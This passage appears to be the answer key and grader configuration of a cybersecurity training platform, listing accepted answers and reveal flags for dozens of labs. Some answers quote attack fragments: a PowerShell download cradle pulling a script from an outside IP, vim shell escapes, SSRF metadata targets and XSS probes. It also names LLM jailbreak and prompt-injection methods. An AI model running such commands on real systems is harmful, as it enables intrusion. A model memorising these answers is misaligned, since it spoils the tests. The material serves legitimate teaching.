    "task_2": { any: [{ exact: ["Add it to a monitoring/alerting watchlist first, not an auto-block list, until it's corroborated"] }], reveal: "SAGE{m0n1t0r_f1rst_n0t_4ut0_bl0ck}" },
    "task_3": { any: [{ exact: ["High confidence AND corroborated by multiple independent feeds, minimizing false-positive blocking risk"] }], reveal: "SAGE{h1gh_c0nf_multi_f33d_4ut0bl0ck}" },
  },
  "ioc-hunting": {
    "task_1": { any: [{ flag: "SAGE{2_hosts_c2_infected}" }], reveal: "SAGE{2_hosts_c2_infected}" },
    "task_2": { any: [{ flag: "SAGE{wkstn_it_14_registry_only}" }], reveal: "SAGE{wkstn_it_14_registry_only}" },
    "task_3": { any: [{ exact: ["Prioritize WKSTN-HR-07 — it matches multiple independent IOCs, strongest confidence"] }], reveal: "SAGE{pr10r1t1z3_by_3v1d3nc3}" },
  },
  "jwt-exploitation": {
    "task_1": { any: [{ flag: "SAGE{sub_482_r0l3_stud3nt}" }], reveal: "SAGE{sub_482_r0l3_stud3nt}" },
    "task_2": { any: [{ exact: ["The server accepted 'alg: none' and skipped signature verification entirely"] }], reveal: "SAGE{4lg_n0n3_byp4ss}" },
    "task_3": { any: [{ exact: ["Explicitly allow-list accepted algorithms server-side and reject 'none'"] }], reveal: "SAGE{4ll0w_l1st_4lg0r1thm}" },
  },
  "kerberoasting": {
    "task_1": { any: [{ flag: "SAGE{svc_sql_rc4_crack4bl3}" }], reveal: "SAGE{svc_sql_rc4_crack4bl3}" },
    "task_2": { any: [{ exact: ["Their passwords are often set once, never rotated, and rarely subject to the same complexity/expiry policy as user accounts"] }], reveal: "SAGE{st4l3_s3rv1c3_4cc0unt_pw}" },
    "task_3": { any: [{ exact: ["Use long random passwords (or managed service accounts) for SPN accounts and enforce AES-only ticket encryption"] }], reveal: "SAGE{4es_0nly_l0ng_r4nd0m_pw}" },
  },
  "kubernetes-basics": {
    "task_1": { any: [{ flag: "SAGE{pr1v1l3g3d_tru3_h0st_4cc3ss}" }], reveal: "SAGE{pr1v1l3g3d_tru3_h0st_4cc3ss}" },
    "task_2": { any: [{ exact: ["A compromised container could read/write anything on the host, effectively escaping container isolation"] }], reveal: "SAGE{h0stp4th_bre4ks_1s0l4t10n}" },
    "task_3": { any: [{ exact: ["Remove privileged mode and the hostPath mount; grant only the specific, minimal permissions the workload actually needs"] }], reveal: "SAGE{l34st_pr1v_p0d_sp3c}" },
  },
  "lateral-movement-techniques": {
    "task_1": { any: [{ flag: "SAGE{wm1_st34lth13st_l3g1t_pr0t0c0l}" }], reveal: "SAGE{wm1_st34lth13st_l3g1t_pr0t0c0l}" },
    "task_2": { any: [{ exact: ["Service creation events (7045) showing a newly installed remote service, often named PSEXESVC"] }], reveal: "SAGE{s3rv1c3_cr34t10n_7045_psex3c}" },
    "task_3": { any: [{ exact: ["Alert on NTLM authentication (logon type 3) for privileged accounts where no corresponding Kerberos ticket request exists"] }], reveal: "SAGE{ntlm_w1th0ut_k3rb3r0s_4l3rt}" },
  },
  "linux-auth-investigation": {
    "task_1": { any: [{ exact: ["SSH Brute Force"] }], reveal: "SAGE{ssh_brut3_f0rc3_succ3ss}" },
    "task_2": { any: [{ exact: ["GTFOBins sudo shell escape"] }], reveal: "SAGE{gtf0b1ns_sud0_3scap3}" },
    "task_3": { any: [{ flag: "SAGE{cr0n_4nd_ssh_k3y_p3rsist3nce}" }], reveal: "SAGE{cr0n_4nd_ssh_k3y_p3rsist3nce}" },
  },
  "linux-persistence-hunt": {
    "task_1": { any: [{ exact: ["45.9.148.22"] }] },
    "task_2": { any: [{ exact: ["execstartpost"] }, { exact: ["exec start post"] }] },
    "task_3": { any: [{ exact: ["/etc/profile.d/01-locale-fix.sh"] }, { exact: ["01-locale-fix.sh"] }] },
  },
  "llm-jailbreaking": {
    "task_1": { any: [{ exact: ["Roleplay / persona jailbreak"] }], reveal: "SAGE{r0l3pl4y_j41lbr34k}" },
    "task_2": { any: [{ exact: ["Fictional framing doesn't change what content is actually generated and potentially misused"] }], reveal: "SAGE{f1ct10n_1s_p4ck4g1ng_0nly}" },
    "task_3": { any: [{ flag: "SAGE{0utput_f1lt3r1ng_n0t_p3rs0n4_trust}" }], reveal: "SAGE{0utput_f1lt3r1ng_n0t_p3rs0n4_trust}" },
  },
  "malware-family-research": {
    "task_1": { any: [{ flag: "SAGE{l0ckb1t_r4ns0mw4r3_f4m1ly}" }], reveal: "SAGE{l0ckb1t_r4ns0mw4r3_f4m1ly}" },
    "task_2": { any: [{ exact: ["Family-specific TTPs and known decryption weaknesses (if any) and known IOCs let you tailor both response and recovery"] }], reveal: "SAGE{f4m1ly_1d_t41l0rs_r3sp0ns3}" },
    "task_3": { any: [{ exact: ["Threat intel feeds/reports specifically tracking this named ransomware family"] }], reveal: "SAGE{ch3ck_f4m1ly_sp3c1f1c_f33ds}" },
  },
  "malware-timeline-analysis": {
    "task_1": { any: [{ flag: "SAGE{5h16m_dw3ll_t1m3}" }], reveal: "SAGE{5h16m_dw3ll_t1m3}" },
    "task_2": { any: [{ exact: ["It shows the attacker had over 5 hours of undetected access before the destructive stage, revealing where detection could have intervened earlier"] }], reveal: "SAGE{t1m3l1n3_r3v34ls_d3t3ct10n_g4p}" },
    "task_3": { any: [{ exact: ["The C2 beacon at 09:15, since it's the earliest point confirming actual compromise (not just a suspicious click) and offers hours of lead time"] }], reveal: "SAGE{c2_b34c0n_34rl13st_r3l14bl3_s1gn4l}" },
  },
  "malware-triage": {
    "task_1": { any: [{ exact: ["Registry Run Key"] }], reveal: "SAGE{r3g1stry_p3rs1st3nc3}" },
    "task_2": { any: [{ exact: ["AsyncRAT"] }], reveal: "SAGE{4syncr4t_1d3nt1f13d}" },
    "task_3": { any: [{ flag: "SAGE{AsyncMutex_6SI8OkPnk}" }], reveal: "SAGE{AsyncMutex_6SI8OkPnk}" },
  },
  "memory-forensics": {
    "task_1": { any: [{ exact: ["svchost32.exe (fake name)"] }], reveal: "SAGE{r0gu3_pr0c3ss_d3t3ct3d}" },
    "task_2": { any: [{ includes: ["185.220.101.47", "4444"] }], reveal: "SAGE{c2_c0nn3ct10n_1d3nt1f13d}" },
    "task_3": { any: [{ exact: ["Process Hollowing"] }], reveal: "SAGE{pr0c3ss_h0ll0w1ng_d3t3ct3d}" },
  },
  "memory-process-hunt": {
    "task_1": { any: [{ exact: ["3288"] }] },
    "task_2": { any: [{ includes: ["temp", "svchost.exe"] }] },
    "task_3": { any: [{ exact: ["1120"] }, { exact: ["lsass.exe"] }] },
  },
  "mft-analysis": {
    "task_1": { any: [{ flag: "SAGE{cl3anup_b4t_r3s1d3nt_r3c0v3r4bl3}" }], reveal: "SAGE{cl3anup_b4t_r3s1d3nt_r3c0v3r4bl3}" },
    "task_2": { any: [{ exact: ["Anti-forensic cleanup — deleting the attacker's tools and clearing the Security event log"] }], reveal: "SAGE{4nt1_f0r3ns1c_cl34nup_scr1pt}" },
    "task_3": { any: [{ exact: ["$FILE_NAME — it's harder for attacker tooling to modify and it matches the actual deployment window"] }], reveal: "SAGE{f1l3_n4m3_4ttr1but3_tru5t3d}" },
  },
  "mitre-attack-mapping": {
    "task_1": { any: [{ exact: ["Initial Access"] }], reveal: "SAGE{initial_acc3ss_ta0001}" },
    "task_2": { any: [{ exact: ["T1003.001 — LSASS Memory"] }], reveal: "SAGE{lsass_dump_t1003}" },
    "task_3": { any: [{ flag: "SAGE{scheduled_task_persistence_t1053}" }], reveal: "SAGE{scheduled_task_persistence_t1053}" },
  },
  "mitre-navigator": {
    "task_1": { any: [{ flag: "SAGE{p3rs1st3nc3_t4ct1c}" }], reveal: "SAGE{p3rs1st3nc3_t4ct1c}" },
    "task_2": { any: [{ exact: ["There's a detection blind spot for Credential Access — that data source or rule set needs to be built out"] }], reveal: "SAGE{bl1nd_sp0t_cr3d3nt14l_4cc3ss}" },
    "task_3": { any: [{ exact: ["It reveals detection coverage gaps side-by-side against the full range of adversary techniques used"] }], reveal: "SAGE{v1su4l1z3_c0v3r4g3_g4ps}" },
  },
  "network-forensics-101": {
    "task_1": { any: [{ flag: "SAGE{185.220.101.47}" }], reveal: "SAGE{185.220.101.47}" },
    "task_2": { any: [{ exact: ["Metasploit"] }], reveal: "SAGE{m3t3rpr3t3r_b34c0n}" },
    "task_3": { any: [{ exact: ["pe_executable", "pe executable"] }, { exact: ["pe"] }], reveal: "SAGE{PE_executable}" },
  },
  "osint-investigation": {
    "task_1": { any: [{ flag: "SAGE{91.108.4.33}" }], reveal: "SAGE{91.108.4.33}" },
    "task_2": { any: [{ flag: "SAGE{ns1.bulletproof-hosting.biz}" }], reveal: "SAGE{ns1.bulletproof-hosting.biz}" },
    "task_3": { any: [{ flag: "SAGE{4_d0m41ns_s4me_1nfr4}" }, { exact: ["4"] }], reveal: "SAGE{4_d0m41ns_s4me_1nfr4}" },
  },
  "password-spraying": {
    "task_1": { any: [{ exact: ["Password spraying (one password, many usernames)"] }], reveal: "SAGE{p4ssw0rd_spr4y_1d3nt1f13d}" },
    "task_2": { any: [{ exact: ["It stays under the per-account lockout threshold by only trying once per user"] }], reveal: "SAGE{l0ck0ut_thr3sh0ld_3v4ded}" },
    "task_3": { any: [{ exact: ["Detect by failed-login volume across many accounts sharing the same password/timing, not per-account count"] }], reveal: "SAGE{cr0ss_4cc0unt_c0rr3l4t10n}" },
  },
  "payment-card-skimmer": {
    "task_1": { any: [{ flag: "SAGE{m4g3c4rt_style_sk1mm3r}" }], reveal: "SAGE{m4g3c4rt_style_sk1mm3r}" },
    "task_2": { any: [{ exact: ["It's designed to capture card data at the exact point customers enter it, avoiding pages that would never carry payment information"] }], reveal: "SAGE{t4rg3ts_p4ym3nt_d4t4_p01nt}" },
    "task_3": { any: [{ exact: ["A Content Security Policy restricting which script sources are allowed to load and execute on the payment page"] }], reveal: "SAGE{csp_bl0cks_unauth0r1z3d_scr1pts}" },
  },
  "pcap-triage": {
    "task_1": { any: [{ exact: ["4"] }, { exact: ["flow 4"] }, { exact: ["185.244.25.171"] }] },
    "task_2": { any: [{ exact: ["60"] }] },
    "task_3": { any: [{ exact: ["updates-cdn.info"] }] },
  },
  "pe-static-analysis": {
    "task_1": { any: [{ exact: ["upx1"] }, { exact: ["upx"] }] },
    "task_2": { any: [{ exact: ["getprocaddress", "getprocaddress()", "loadlibrarya()"] }, { exact: ["loadlibrarya"] }] },
    "task_3": { any: [{ exact: ["cdn-telemetry-sync.net"] }] },
  },
  "persistence-detection": {
    "task_1": { any: [{ exact: ["OneDriveStandaloneUpdater"] }], reveal: "SAGE{m4sq3r4d1ng_sch3dul3d_t4sk}" },
    "task_2": { any: [{ exact: ["WinUpdate32"] }], reveal: "SAGE{run_k3y_p3rsist3nc3}" },
    "task_3": { any: [{ flag: "SAGE{wupdmgr_svc_masquerade}" }], reveal: "SAGE{wupdmgr_svc_masquerade}" },
  },
  "phishing-analysis": {
    "task_1": { any: [{ exact: ["Three — SPF fail, Reply-To mismatch, and PhishKit X-Mailer"] }], reveal: "SAGE{sp00f3d_3m41l_h34d3rs}" },
    "task_2": { any: [{ includes: ["malicious-domain"] }], reveal: "SAGE{d3obfusc4t3d_ph1sh1ng_url}" },
    "task_3": { any: [{ exact: ["Registry Run Key"] }], reveal: "SAGE{m4cr0_r3g1stry_p3rs1st3nc3}" },
  },
  "phishing-click-incident": {
    "task_1": { any: [{ flag: "SAGE{corp_it_support_info_lookalike}" }], reveal: "SAGE{c0rp_1t_supp0rt_1nf0_l00k4l1k3}" },
    "task_2": { any: [{ exact: ["Clicking the link downloaded a disguised executable that launched an encoded PowerShell command establishing C2"] }], reveal: "SAGE{3x3c_ch41n_t0_c2}" },
    "task_3": { any: [{ flag: "SAGE{198_51_100_77_c2_b34c0n}" }], reveal: "SAGE{198_51_100_77_c2_b34c0n}" },
  },
  "post-exploitation-basics": {
    "task_1": { any: [{ flag: "SAGE{pl41nt3xt_cr3d_1n_b4sh_h1st0ry}" }], reveal: "SAGE{pl41nt3xt_cr3d_1n_b4sh_h1st0ry}" },
    "task_2": { any: [{ exact: ["vim can be used to spawn a root shell via :!sh, giving full privilege escalation despite being 'just an editor'"] }], reveal: "SAGE{v1m_sud0_pr1v3sc}" },
    "task_3": { any: [{ exact: ["Check network config/ARP table for other reachable internal hosts to plan lateral movement"] }], reveal: "SAGE{3num3r4t3_n3tw0rk_f0r_p1v0t}" },
  },
  "powershell-attack-detection": {
    "task_1": { any: [{ exact: ["-Enc (Base64-encoded command)"] }], reveal: "SAGE{3nc0d3d_p0w3rsh3ll_fl4g}" },
    "task_2": { any: [{ exact: ["IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.42/p.ps1')"] }, { includes: ["198.51.100.42/p.ps1"] }], reveal: "SAGE{d0wnl04d_cr4dl3_f0und}" },
    "task_3": { any: [{ exact: ["PowerShell profile.ps1 persistence"] }], reveal: "SAGE{pr0fil3_p3rsist3nc3}" },
  },
  "prefetch-analysis": {
    "task_1": { any: [{ flag: "SAGE{upd4t3_h3lp3r_run_c0unt_1}" }], reveal: "SAGE{upd4t3_h3lp3r_run_c0unt_1}" },
    "task_2": { any: [{ exact: ["It ran from C:\\Users\\Public, not a normal installation directory"] }], reveal: "SAGE{public_f0ld3r_3x3cut10n}" },
    "task_3": { any: [{ exact: ["The malicious attachment executed within seconds of being opened, confirming this is the entry point"] }], reveal: "SAGE{pr3f3tch_c0nf1rms_3ntry_p01nt}" },
  },
  "privilege-escalation": {
    "task_1": { any: [{ exact: ["find"] }] },
    "task_2": { any: [{ includes: ["vim", ":!sh"] }, { includes: ["vim", ":!/bin/sh"] }, { includes: ["vim", ":shell"] }, { includes: ["vim", ":!bash"] }] },
    "task_3": { any: [{ includes: ["cat", "/root/flag.txt"] }, { includes: ["less", "/root/flag.txt"] }, { includes: ["more", "/root/flag.txt"] }, { includes: ["strings", "/root/flag.txt"] }] },
  },
  "prompt-injection": {
    "task_1": { any: [{ exact: ["Direct prompt injection"] }], reveal: "SAGE{d1r3ct_pr0mpt_1nj3ct10n}" },
    "task_2": { any: [{ includes: ["refund_tool", "iban-attacker"] }], reveal: "SAGE{1nd1r3ct_1nj3ct10n_v1a_t1ck3t}" },
    "task_3": { any: [{ exact: ["Treat fetched content as data only, and gate sensitive tools behind human approval"] }], reveal: "SAGE{architectur4l_m1t1g4t10n}" },
  },
  "ransomware-incident": {
    "task_1": { any: [{ flag: "SAGE{macr0_3n4bl3d_x1sm_ph1sh1ng}" }], reveal: "SAGE{macr0_3n4bl3d_x1sm_ph1sh1ng}" },
    "task_2": { any: [{ exact: ["They reused a cached domain admin credential to access the file server's admin share directly"] }], reveal: "SAGE{c4ch3d_d0m41n_4dm1n_r3us3}" },
    "task_3": { any: [{ exact: ["Isolate FS01 and WKSTN-ACC-09 from the network immediately, then restore from the last known-good backup — do not pay or negotiate first"] }], reveal: "SAGE{1s0l4t3_r3st0r3_d0nt_p4y_f1rst}" },
  },
  "rdp-attack-investigation": {
    "task_1": { any: [{ exact: ["RDP brute force"] }], reveal: "SAGE{rdp_brut3_f0rc3}" },
    "task_2": { any: [{ exact: ["Created a new local account"] }], reveal: "SAGE{n3w_acc0unt_cr3at3d}" },
    "task_3": { any: [{ flag: "SAGE{b4ckup_svc_4dmin_p3rsist3nce}" }], reveal: "SAGE{b4ckup_svc_4dmin_p3rsist3nce}" },
  },
  "rogue-wireless-ap": {
    "task_1": { any: [{ flag: "SAGE{ev1l_tw1n_4p_l00k4l1k3_ss1d}" }], reveal: "SAGE{ev1l_tw1n_4p_l00k4l1k3_ss1d}" },
    "task_2": { any: [{ exact: ["Triangulating signal strength across multiple scan points helps physically locate the device within the building"] }], reveal: "SAGE{tr14ngul4t3_s1gn4l_l0c4t3_d3v1c3}" },
    "task_3": { any: [{ exact: ["Force a password reset for potentially affected accounts, since credentials may have been captured over the rogue AP"] }], reveal: "SAGE{r3s3t_cr3ds_p0t3nt14lly_c4ptur3d}" },
  },
  "secure-ai-apis": {
    "task_1": { any: [{ flag: "SAGE{4p1_k3y_s3rv3r_s1d3_0nly}" }], reveal: "SAGE{4p1_k3y_s3rv3r_s1d3_0nly}" },
    "task_2": { any: [{ exact: ["Per-user rate limiting and request quotas on the LLM endpoint"] }], reveal: "SAGE{r4t3_l1m1t_pr3v3nts_c0st_d0s}" },
    "task_3": { any: [{ exact: ["Input validation and output filtering, since the API sits between untrusted users and a model that can be manipulated"] }], reveal: "SAGE{v4l1d4t3_1nput_f1lt3r_0utput}" },
  },
  "sigma-rule-creation": {
    "task_1": { any: [{ exact: ["process_creation"] }], reveal: "SAGE{pr0c3ss_cr34t10n_l0gs0urc3}" },
    "task_2": { any: [{ flag: "SAGE{payload_dll_entry}" }], reveal: "SAGE{payload_dll_entry}" },
    "task_3": { any: [{ exact: ["It also matches legitimate uses of rundll32 with unrelated arguments — too broad"] }], reveal: "SAGE{t00_br0ad_f4ls3_p0s1t1v3s}" },
  },
  "sigma-to-sentinel": {
    "task_1": { any: [{ exact: ["DeviceProcessEvents (or SecurityEvent) — process creation events"] }], reveal: "SAGE{d3v1c3pr0c3ss3v3nts_t4bl3}" },
    "task_2": { any: [{ exact: ["It matches on the binary name alone, so it will fire on essentially all legitimate rundll32 usage — too broad"] }], reveal: "SAGE{t00_br0ad_kql_transl4t10n}" },
    "task_3": { any: [{ exact: ["A condition on the specific suspicious DLL path/argument pattern, not just the process name"] }], reveal: "SAGE{4rgum3nt_sc0p3d_d3t3ct10n}" },
  },
  "sigma-to-splunk": {
    "task_1": { any: [{ exact: ["index=windows source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=10 TargetImage=\"*\\\\lsass.exe\" GrantedAccess=\"0x1010\""] }], reveal: "SAGE{spl_qu3ry_m4pp3d}" },
    "task_2": { any: [{ flag: "SAGE{sysm0n_3v3nt_10_pr0c3ss_4cc3ss}" }], reveal: "SAGE{sysm0n_3v3nt_10_pr0c3ss_4cc3ss}" },
    "task_3": { any: [{ exact: ["Field names and log sources differ between SIEMs — a rule is only as good as the mapping to the actual schema"] }], reveal: "SAGE{s13m_f13ld_m4pp1ng_v4r13s}" },
  },
  "splunk-detection-hunt": {
    "task_1": { any: [{ flag: "SAGE{60s_1nt3rv4l_b34c0n1ng}" }], reveal: "SAGE{60s_1nt3rv4l_b34c0n1ng}" },
    "task_2": { any: [{ exact: ["stats on time deltas between requests to the same destination, filtering for low variance/regular intervals"] }], reveal: "SAGE{t1m3_d3lt4_v4r14nc3_4n4lys1s}" },
    "task_3": { any: [{ exact: ["Pivot on that domain across ALL other hosts' proxy logs to find any other infected machines"] }], reveal: "SAGE{p1v0t_4cr0ss_4ll_h0sts}" },
  },
  "ssrf-attack": {
    "task_1": { any: [{ includes: ["localhost"] }, { includes: ["127.0.0.1"] }], reveal: "SAGE{ssrf_1nt3rn4l_4cc3ss}" },
    "task_2": { any: [{ flag: "SAGE{cl0ud_m3t4d4t4_ssrf}" }, { exact: ["169.254.169.254"] }], reveal: "SAGE{cl0ud_m3t4d4t4_ssrf}" },
    "task_3": { any: [{ includes: ["0x7f000001"] }, { includes: ["2130706433"] }], reveal: "SAGE{1p_0bfusc4t10n_byp4ss}" },
  },
  "supply-chain-compromise": {
    "task_1": { any: [{ flag: "SAGE{tru5t3d_51gn3d_upd4t3_b4ckd00r}" }], reveal: "SAGE{tru5t3d_51gn3d_upd4t3_b4ckd00r}" },
    "task_2": { any: [{ exact: ["Code signing proves origin/integrity from the vendor, not that the vendor's own build pipeline wasn't compromised — it's necessary but not sufficient"] }], reveal: "SAGE{s1gn1ng_n0t_suff1c13nt_4l0n3}" },
    "task_3": { any: [{ exact: ["Identify every system that installed the compromised update version and treat all of them as potentially compromised until proven otherwise"] }], reveal: "SAGE{4ll_1nst4lls_4ss3ss3d_4s_c0mpr0m1s3d}" },
  },
  "third-party-vendor-compromise": {
    "task_1": { any: [{ flag: "SAGE{4ssum3_v3nd0r_cr3ds_c0mpr0m1s3d}" }], reveal: "SAGE{4ssum3_v3nd0r_cr3ds_c0mpr0m1s3d}" },
    "task_2": { any: [{ exact: ["Immediately revoke or disable the vendor's remote access credentials/connections until their breach is fully understood"] }], reveal: "SAGE{r3v0k3_v3nd0r_4cc3ss_n0w}" },
    "task_3": { any: [{ exact: ["Whether third-party access follows least-privilege and is properly monitored/logged, not just trusted by default"] }], reveal: "SAGE{l34st_pr1v_4nd_m0n1t0r_v3nd0rs}" },
  },
  "threat-actor-profiling": {
    "task_1": { any: [{ flag: "SAGE{t4rg3t3d_4pt_styl3_1ntrus10n}" }], reveal: "SAGE{t4rg3t3d_4pt_styl3_1ntrus10n}" },
    "task_2": { any: [{ exact: ["It lets defenders anticipate likely next moves and apply relevant known mitigations, even under attribution uncertainty"] }], reveal: "SAGE{4nt1c1p4t3_n3xt_m0v3s_fr0m_pr0f1l3}" },
    "task_3": { any: [{ exact: ["TTPs can be copied or shared between groups, so overlap alone isn't proof of the same actor"] }], reveal: "SAGE{ttp_0v3rl4p_n0t_pr00f}" },
  },
  "threat-hunting-lateral-movement": {
    "task_1": { any: [{ flag: "SAGE{1_4cc0unt_5_h0sts_2_m1n}" }], reveal: "SAGE{1_4cc0unt_5_h0sts_2_m1n}" },
    "task_2": { any: [{ exact: ["Check whether this account's baseline behavior ever touches these hosts, and look for accompanying process execution (e.g. remote exec tools) on each"] }], reveal: "SAGE{b4s3l1n3_4nd_pr0c3ss_c0nf1rm}" },
    "task_3": { any: [{ exact: ["Disable/reset the compromised account's credentials and isolate the affected hosts to stop further spread"] }], reveal: "SAGE{d1s4bl3_4cc0unt_1s0l4t3_h0sts}" },
  },
  "urlscan-investigation": {
    "task_1": { any: [{ flag: "SAGE{secur30ff1c3365l0g1n_0ff1c3365_1mp3rs0n4t10n}" }], reveal: "SAGE{secur30ff1c3365l0g1n_0ff1c3365_1mp3rs0n4t10n}" },
    "task_2": { any: [{ exact: ["Multiple hops through URL shorteners before landing on a brand-new lookalike domain"] }], reveal: "SAGE{mult1_h0p_r3d1r3ct_ch41n}" },
    "task_3": { any: [{ exact: ["Submit the domain for takedown/blocklisting and block it at the web proxy immediately"] }], reveal: "SAGE{t4k3d0wn_4nd_pr0xy_bl0ck}" },
  },
  "usb-artefacts": {
    "task_1": { any: [{ flag: "SAGE{4c530001a1b2c3d4_l4st_c0nn_apr9}" }], reveal: "SAGE{4c530001a1b2c3d4_l4st_c0nn_apr9}" },
    "task_2": { any: [{ exact: ["Files were browsed/accessed on that exact USB device, not just plugged in"] }], reveal: "SAGE{sh3llb4gs_c0nf1rm_4cc3ss}" },
    "task_3": { any: [{ exact: ["This device exfiltrated 3.4GB of data; image the device and preserve it as evidence before returning it"] }], reveal: "SAGE{1m4g3_pr3s3rv3_3v1d3nc3}" },
  },
  "usb-forensics": {
    "task_1": { any: [{ flag: "SAGE{2_c0nf1d3nt14l_f1l3s_jun14}" }], reveal: "SAGE{2_c0nf1d3nt14l_f1l3s_jun14}" },
    "task_2": { any: [{ exact: ["It shows the E: drive was used before too, but only the June 14 files matter for the exfiltration timeline"] }], reveal: "SAGE{f0cus_0n_r3l3v4nt_t1m3fr4m3}" },
    "task_3": { any: [{ exact: ["Treat this as strong circumstantial evidence, secure it for HR/Legal, and attempt to recover the physical device if still on-site"] }], reveal: "SAGE{pr3s3rv3_4s_c1rcumst4nt14l_3v1d3nc3}" },
  },
  "virustotal-investigation": {
    "task_1": { any: [{ flag: "SAGE{3m0t3t_52_0f_71_v3nd0rs}" }], reveal: "SAGE{3m0t3t_52_0f_71_v3nd0rs}" },
    "task_2": { any: [{ exact: ["A domain registered only 4 days before the malware sample first appeared"] }], reveal: "SAGE{fr3shly_r3g1st3r3d_c2}" },
    "task_3": { any: [{ exact: ["Block both domains and hunt your own environment's logs for any historical contact with them"] }], reveal: "SAGE{bl0ck_4nd_r3tr0_hunt}" },
  },
  "web-recon": {
    "task_1": { any: [{ includes: ["admin-panel-9f3a2"] }], reveal: "SAGE{r0b0ts_txt_4dm1n_p4th}" },
    "task_2": { any: [{ exact: ["/.git/config"] }], reveal: "SAGE{g1t_c0nf1g_3xp0s3d}" },
    "task_3": { any: [{ exact: ["admin-staging.target.com"] }], reveal: "SAGE{4dm1n_st4g1ng_subd0m41n}" },
  },
  "web-server-log-analysis": {
    "task_1": { any: [{ exact: ["Automated SQL Injection scan (sqlmap)"] }], reveal: "SAGE{sqlm4p_sc4n_d3t3ct3d}" },
    "task_2": { any: [{ flag: "SAGE{p4th_tr4v3rsal_c0nfig_php}" }], reveal: "SAGE{p4th_tr4v3rsal_c0nfig_php}" },
    "task_3": { any: [{ exact: ["Unrestricted file upload (web shell)"] }], reveal: "SAGE{w3bsh3ll_upl04d3d}" },
  },
  "whois-analysis": {
    "task_1": { any: [{ flag: "SAGE{d0m41n_r3g1st3r3d_3_d4ys_4g0}" }], reveal: "SAGE{d0m41n_r3g1st3r3d_3_d4ys_4g0}" },
    "task_2": { any: [{ exact: ["The domains likely belong to the same actor or campaign, letting you pivot from one IOC to find more"] }], reveal: "SAGE{sh4r3d_1nfr4_p1v0t_c4mp41gn}" },
    "task_3": { any: [{ exact: ["`Domain: secure-firstnatlonal-bank.com\nRegistered: 2026-07-21 (3 days ago)\nRegistrant: REDACTED FOR PRIVACY\nRegistrar: EarlyBird Domains LLC (flagged in 40+ prior phishing reports)\nNameservers: ns1.bulletproof-host.ru, ns2.bulletproof-host.ru` privacy services and spoofed registration details are trivial to use, so `Domain: secure-firstnatlonal-bank.com\nRegistered: 2026-07-21 (3 days ago)\nRegistrant: REDACTED FOR PRIVACY\nRegistrar: EarlyBird Domains LLC (flagged in 40+ prior phishing reports)\nNameservers: ns1.bulletproof-host.ru, ns2.bulletproof-host.ru` alone is weak evidence without corroboration"] }], reveal: "SAGE{wh01s_4l0n3_w34k_3v1d3nc3}" },
  },
  "windows-log-analysis": {
    "task_1": { any: [{ exact: ["Brute Force"] }], reveal: "SAGE{brut3_f0rc3_d3t3ct3d}" },
    "task_2": { any: [{ exact: ["WMI"] }], reveal: "SAGE{wm1_l4t3r4l_m0v3m3nt}" },
    "task_3": { any: [{ flag: "SAGE{185.220.101.47}" }], reveal: "SAGE{185.220.101.47}" },
  },
  "windows-registry-analysis": {
    "task_1": { any: [{ includes: ["evil_toolkit.exe"] }], reveal: "SAGE{3v1l_t00lk1t_ex3}" },
    "task_2": { any: [{ exact: ["ShimCache timestamps reflect file modification time, corroborating when the binary first appeared"] }], reveal: "SAGE{sh1mc4ch3_c0rr0b0r4t3s_t1m3l1n3}" },
    "task_3": { any: [{ flag: "SAGE{cmtm0n_s1l3nt_runmru_p3rs1st3nc3}" }], reveal: "SAGE{cmtm0n_s1l3nt_runmru_p3rs1st3nc3}" },
  },
  "xss-fundamentals": {
    "task_1": { any: [{ includes: ["<script", "alert"] }], reveal: "SAGE{r3fl3ct3d_xss_p0p}" },
    "task_2": { any: [{ exact: ["Session cookies"] }], reveal: "SAGE{st0r3d_xss_c00k13_th3ft}" },
    "task_3": { any: [{ flag: "SAGE{cdn_bypass_csp_byp4ss}" }, { exact: ["cdn.jsdelivr.net"] }], reveal: "SAGE{cdn_bypass_csp_byp4ss}" },
  },
  "xxe-injection": {
    "task_1": { any: [{ exact: ["A custom entity that loads the contents of a local file"] }], reveal: "SAGE{3xt3rn4l_3nt1ty_d3cl4r3d}" },
    "task_2": { any: [{ flag: "SAGE{3tc_p4sswd_d1scl0s3d}" }], reveal: "SAGE{3tc_p4sswd_d1scl0s3d}" },
    "task_3": { any: [{ exact: ["Disable external entity and DTD processing in the XML parser configuration"] }], reveal: "SAGE{d1s4bl3_3xt3rn4l_3nt1ti3s}" },
  },
  "yara-rule-basics": {
    "task_1": { any: [{ flag: "SAGE{185_220_101_9_gate_php}" }], reveal: "SAGE{185_220_101_9_gate_php}" },
    "task_2": { any: [{ exact: ["0x5A4D — the 'MZ' magic bytes identifying a Windows PE file"] }], reveal: "SAGE{mz_h34d3r_p3_ch3ck}" },
    "task_3": { any: [{ exact: ["MD5 is trivial to change by altering a single byte — pair YARA with behavioral rules"] }], reveal: "SAGE{h4sh_1s_fr4g1l3}" },
  },
  "zero-day-exploitation": {
    "task_1": { any: [{ flag: "SAGE{n0_p4tch_4v41l4bl3_y3t}" }], reveal: "SAGE{n0_p4tch_4v41l4bl3_y3t}" },
    "task_2": { any: [{ exact: ["Deploy compensating controls — WAF rules, network segmentation, disabling the vulnerable feature — while waiting for an official patch"] }], reveal: "SAGE{c0mp3ns4t1ng_c0ntr0ls_n0t_p4tch}" },
    "task_3": { any: [{ exact: ["Responsible disclosure gets the vendor building a fix faster and helps other organizations who are equally exposed"] }], reveal: "SAGE{r3sp0ns1bl3_d1scl0sur3_h3lps_4ll}" },
  },
  "soc-alert-investigation": {
    // Freeform write-up: recorded either way, but each finding is marked so the
    // learner still sees which ones they got right.
    "investigation": {
      fields: {
        ip: [{ exact: ["198.51.100.71", "SAGE{198.51.100.71}"] }],
        access: [{ exact: ["spear_phishing"] }],
        process: [{ includes: ["winword"] }],
        account: [{ includes: ["finance.user"] }],
      },
    },
    "task_2": { any: [{ includes: ["preserve", "block_c2", "isolate", "reset_creds", "notify"], notIncludes: ["reimage", "shutdown"] }] },
    "task_3": {
      fields: {
        pivotHost: [{ exact: ["FINANCE-SERVER01", "\\\\FINANCE-SERVER01"] }],
        lateralTool: [{ exact: ["wmi"] }],
      },
      requireAllFields: true,
    },
  },
  "sql-injection-101": {
    "task_1": { any: [{ custom: "sqli-auth-bypass" }], reveal: "SAGE{cl4ss1c_0r_1_eq_1}" },
    "task_2": { any: [{ custom: "sqli-union" }], reveal: "SAGE{un10n_s3l3ct_d4t4_l34k}" },
    "task_3": { any: [{ custom: "sqli-blind" }], reveal: "SAGE{bl1nd_bl00l3an_sqli_m4st3r}" },
  },
